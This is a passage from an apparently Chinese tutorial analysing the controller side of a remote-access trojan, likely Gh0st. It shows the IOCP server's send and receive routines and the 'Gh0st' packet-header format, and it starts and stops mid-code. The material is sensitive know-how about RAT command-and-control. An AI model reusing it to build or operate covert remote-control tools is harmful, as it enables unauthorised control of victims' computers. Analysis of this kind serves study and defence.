发送这个队列的消息  搜索 IOWrite</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\tpContext<span class=\"token operator\">-></span>m_nMsgOut<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发送数据前先把要发送的数据压缩了一下，然后加入数据头，数据头为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 这里是数据发送的标记  服务端同客户端字符必须一致</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BYTE bPacketFlag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'G'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'t'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">,</span> bPacketFlag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>然后就创建了一个叫  <code>IOWrite</code>  的队列，搜索一下，发现这个  <code>IO_MESSAGE_HANDLER(IOWrite, OnClientWriting)</code>   转到  <code>OnClientWriting</code> <br />\n 函数查看：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">CIOCPServer</span><span class=\"token operator\">::</span><span class=\"token function\">OnClientWriting</span><span class=\"token punctuation\">(</span>ClientContext<span class=\"token operator\">*</span> pContext<span class=\"token punctuation\">,</span> DWORD dwIoSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">try</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">static</span> DWORD nLastTick <span class=\"token operator\">=</span> <span class=\"token function\">GetTickCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">static</span> DWORD nBytes <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tnBytes <span class=\"token operator\">+=</span> dwIoSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">GetTickCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> nLastTick <span class=\"token operator\">>=</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\tnLastTick <span class=\"token operator\">=</span> <span class=\"token function\">GetTickCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token function\">InterlockedExchange</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPLONG<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>m_nSendKbps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nBytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tnBytes <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tULONG ulFlags <span class=\"token operator\">=</span> MSG_PARTIAL<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// Finished writing - tidy up</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Delete</span><span class=\"token punctuation\">(</span>dwIoSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBufferLen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">ClearBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token comment\">// Write complete</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token function\">SetEvent</span><span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_hWriteComplete<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// issue new read after this one</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\tOVERLAPPEDPLUS <span class=\"token operator\">*</span> pOverlap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">OVERLAPPEDPLUS</span><span class=\"token punctuation\">(</span>IOWrite<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token function\">m_pNotifyProc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span> m_pFrame<span class=\"token punctuation\">,</span> pContext<span class=\"token punctuation\">,</span> NC_TRANSMIT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 调用一下回调函数</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_wsaOutBuffer<span class=\"token punctuation\">.</span>buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> pContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_wsaOutBuffer<span class=\"token punctuation\">.</span>len <span class=\"token operator\">=</span> pContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBufferLen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>             <span class=\"token comment\">// 最终调用 WSASend 将数据发送出去</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t<span class=\"token keyword\">int</span> nRetVal <span class=\"token operator\">=</span> <span class=\"token function\">WSASend</span><span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_Socket<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token operator\">&amp;</span>pContext<span class=\"token operator\">-></span>m_wsaOutBuffer<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token operator\">&amp;</span>pContext<span class=\"token operator\">-></span>m_wsaOutBuffer<span class=\"token punctuation\">.</span>len<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t\t\t\tulFlags<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token operator\">&amp;</span>pOverlap<span class=\"token operator\">-></span>m_ol<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token comment\">// 判断是否成功。如果失败就执行 if 中的代码</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> nRetVal <span class=\"token operator\">==</span> SOCKET_ERROR <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">WSAGetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> WSA_IO_PENDING <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t\t<span class=\"token function\">RemoveStaleClient</span><span class=\"token punctuation\">(</span> pContext<span class=\"token punctuation\">,</span> FALSE <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// issue new read after this one</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现其调用了回调函数，查看了一下，什么也没做，直接 break 返回了。<br />\n最后就调用了  <code>WSASend</code>  把数据发了出去。</p>\n<h3 id=\"ciocpserver-类的-onclientreading-函数分析\"><a class=\"anchor\" href=\"#ciocpserver-类的-onclientreading-函数分析\">#</a> CIOCPServer 类的 OnClientReading 函数分析</h3>\n<p>上面的  <code>OnClientWriting</code>  是向被控端发送数据时调用。</p>\n<p>接下来分析  <code>OnClientReading</code>  了解当主控端收到消息时如何处理。</p>\n<p>可以在 CIOCPServer 中看到 IO 操作的映射函数  <code>IO_MESSAGE_HANDLER(IORead, OnClientReading)</code>  当有消息发来的时候就调用了  <code>OnClientReading</code>  。</p>\n<p>还是简单的了解一下流程</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">CIOCPServer</span><span class=\"token operator\">::</span><span class=\"token function\">OnClientReading</span><span class=\"token punctuation\">(</span>ClientContext<span class=\"token operator\">*</span> pContext<span class=\"token punctuation\">,</span> DWORD dwIoSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tCLock <span class=\"token function\">cs</span><span class=\"token punctuation\">(</span>CIOCPServer<span class=\"token operator\">::</span>m_cs<span class=\"token punctuation\">,</span> <span class=\"token string\">\"OnClientReading\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">try</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">static</span> DWORD nLastTick <span class=\"token operator\">=</span> <span class=\"token function\">GetTickCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">static</span> DWORD nBytes <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tnBytes <span class=\"token operator\">+=</span> dwIoSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">GetTickCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> nLastTick <span class=\"token operator\">>=</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\tnLastTick <span class=\"token operator\">=</span> <span class=\"token function\">GetTickCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token function\">InterlockedExchange</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPLONG<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>m_nRecvKbps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nBytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tnBytes <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwIoSize <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token function\">RemoveStaleClient</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\">// 如果出现错误要求重发数据</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dwIoSize <span class=\"token operator\">==</span> FLAG_SIZE <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_byInBuffer<span class=\"token punctuation\">,</span> m_bPacketFlag<span class=\"token punctuation\">,</span> FLAG_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token comment\">// 重新发送</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">,</span> pContext<span class=\"token operator\">-></span>m_ResendWriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pContext<span class=\"token operator\">-></span>m_ResendWriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBufferLen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token comment\">// 必须再投递一个接收请求</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token function\">PostRecv</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token comment\">// 将接收到的数据写入</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token comment\">// Add the message to out message</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token comment\">// Dont forget there could be a partial, 1, 1 or more + partial mesages</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\tpContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_byInBuffer<span class=\"token punctuation\">,</span>dwIoSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t<span class=\"token comment\">// 调用回调函数 传递\tNC_RECEIVE  跟进回调函数查看  </span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t<span class=\"token function\">m_pNotifyProc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span> m_pFrame<span class=\"token punctuation\">,</span> pContext<span class=\"token punctuation\">,</span> NC_RECEIVE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>         <span class=\"token comment\">// 如果接收的数据 大于标识头大小</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token comment\">// Check real Data</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBufferLen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> HDR_SIZE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\tBYTE bPacketFlag<span class=\"token punctuation\">[</span>FLAG_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span>bPacketFlag<span class=\"token punctuation\">,</span> pContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token comment\">// 这里对比 是否是同一个标识头 就是上一节给大家将的 我们再去看看 此类的构造函数</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">,</span> bPacketFlag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">throw</span> <span class=\"token string\">\"bad buffer\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t\t<span class=\"token comment\">// 得到数据大小  到 Send 函数看一下 就明白了  搜索  Send</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t<span class=\"token keyword\">int</span> nSize <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>nSize<span class=\"token punctuation\">,</span> pContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBuffer</span><span class=\"token punctuation\">(</span>FLAG_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t<span class=\"token comment\">// Update Process Variable</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_nTransferProgress <span class=\"token operator\">=</span> pContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBufferLen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">100</span> <span class=\"token operator\">/</span> nSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token comment\">// 如果数据大小真确</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nSize <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">GetBufferLen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> nSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">int</span> nUnCompressLength <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Read off header</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t\t\t</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// 读取数据</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t\t\tpContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PBYTE<span class=\"token punctuation\">)</span> bPacketFlag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\t\t\tpContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PBYTE<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>nSize<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t\t\tpContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PBYTE<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>nUnCompressLength<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t\t\t\t</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\t\t\t<span class=\"token comment\">////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\t\t\t<span class=\"token comment\">////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// SO you would process your data here</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// </span></pre></td></tr><tr><td 